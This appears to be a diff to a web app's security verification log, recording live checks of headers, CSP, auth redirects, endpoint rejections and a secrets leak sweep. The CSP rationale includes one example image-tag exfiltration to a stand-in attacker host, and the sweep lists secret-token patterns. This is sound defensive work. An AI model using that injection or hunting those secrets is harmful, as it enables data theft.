@@ -450,3 +450,94 @@ mutable `search_path` on `set_updated_at` and `reject_audit_log_mutation`, and R
 > Supabase: `anon` and `authenticated` hold their own explicit `EXECUTE` grants from Supabase's
 > default privileges, so they must be named directly in the `REVOKE`. This is the same class of
 > mistake as the table-versus-column grant issue in R1.
+
+## Phase 14 — Preview verification
+
+Verified against Preview deployment `dpl_4v7XScgFhrMTETzd8zd1WLRhKMzK`
+(commit `c7f13a7`), reached through a temporary Vercel Protection Bypass for
+Automation. **That bypass was revoked immediately afterwards** and the project
+now reports zero automation bypasses; an unauthenticated request to a Preview
+URL returns `302 → vercel.com/sso-api` again.
+
+### Response headers, observed live
+
+`Content-Security-Policy` (per-request nonce), `Strict-Transport-Security`
+(`max-age=63072000; includeSubDomains; preload`), `X-Frame-Options: DENY`,
+`X-Content-Type-Options: nosniff`, `Referrer-Policy:
+strict-origin-when-cross-origin`, `Permissions-Policy` (camera, microphone,
+geolocation, payment, usb and interest-cohort all empty),
+`Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy:
+same-origin`.
+
+### Two CSP entries that look wrong and are not
+
+`script-src` carries `'unsafe-inline'` **after** the nonce and
+`'strict-dynamic'`. A browser that understands `strict-dynamic` ignores
+`'unsafe-inline'` entirely; one that does not would otherwise reject every
+script on the page. Removing it weakens nothing in a modern browser and breaks
+old ones, so it stays — but note the ordering is what makes it safe.
+
+`img-src` no longer carries a `https:` wildcard. It was there in case Facebook
+thumbnails were embedded; they are not, since the app links to permalinks and
+renders no remote image. An unrestricted `https:` would let an injected
+`<img src="https://attacker/?d=…">` exfiltrate even with script blocked.
+
+### Route protection, observed live
+
+Every application route redirected `307 → /login` while signed out, preserving
+the intended destination (`/dashboard` → `/login?next=%2Fdashboard`). Checked:
+`/`, `/dashboard`, `/admin/streamers`, `/admin/users`, `/reports`, `/settings`.
+
+### Machine endpoints, observed live
+
+| Endpoint | No credentials | Wrong bearer |
+| --- | --- | --- |
+| `POST /api/n8n/sync` | 401 | 401 |
+| `GET /api/n8n/export` | 401 | 401 |
+| `POST /api/automation/sync-all` | 401 | 401 |
+| `GET /api/automation/exports/posts` | 401 | 401 |
+| `GET /api/automation/google-sheets/schema` | 401 | 401 |
+| `GET /api/cron/daily-sync` | 401 | 401 |
+| `GET /api/cron/facebook-sync` | 401 | 401 |
+
+Wrong HTTP method returns 405 rather than 401, which leaks only that the path
+exists — the same thing the route list in this repository already tells you.
+
+`/api/health` returns status, name, version, environment, database
+reachability, latency and a timestamp. No credential, hostname or connection
+string.
+
+### Leak sweep
+
+`/login`, `/api/health`, a 404 page and `/api/n8n/sync` were each scanned for
+`EAA…` Page tokens, `sb_secret_…`, `sk-ant-…`, `service_role`,
+`postgres://`/`postgresql://`, `SUPABASE_SERVICE`, `TOKEN_ENCRYPTION` and
+`/var/task` stack frames. All clean. The 401 body is
+`{"error":"unauthenticated","message":"You must be signed in to do that."}` —
+no stack trace.
+
+### Not verified, and why
+
+- **A successful authenticated export.** Reading `N8N_API_SECRET` back out of
+  Vercel was blocked, so only the rejection path above was exercised. The
+  success path is covered by tests, not by a live Preview call.
+- **AI summarisation.** `ANTHROPIC_API_KEY` is still a placeholder and
+  `AI_SUMMARIZATION_ENABLED` is false, so there is nothing live to test.
+- **Signed-in pages and RBAC in a browser.** Sign-in needs credentials this
+  process does not hold. Role separation is covered by the test suite.
+- **A custom domain.** None is connected. The canonical URL comes from
+  `NEXT_PUBLIC_APP_URL`, so connecting one later is a variable change.
+
+### Two build failures worth remembering
+
+Both passed `npm run verify` locally and failed on Vercel.
+
+`export const maxDuration = dailyMaxDuration` — an imported binding — was
+rejected as an *invalid segment configuration export*. Next resolves segment
+config by static analysis and never evaluates the module, so the value must be
+a literal. Vercel reported this as `module_not_found`, which points nowhere
+near the cause; the real message was only in the build log.
+
+A literal `\x08` inside a regex in the logger compiled and linted clean while
+being invisible in an editor, in `grep` and in a file reader. See
+`tests/source-control-characters.test.ts`.
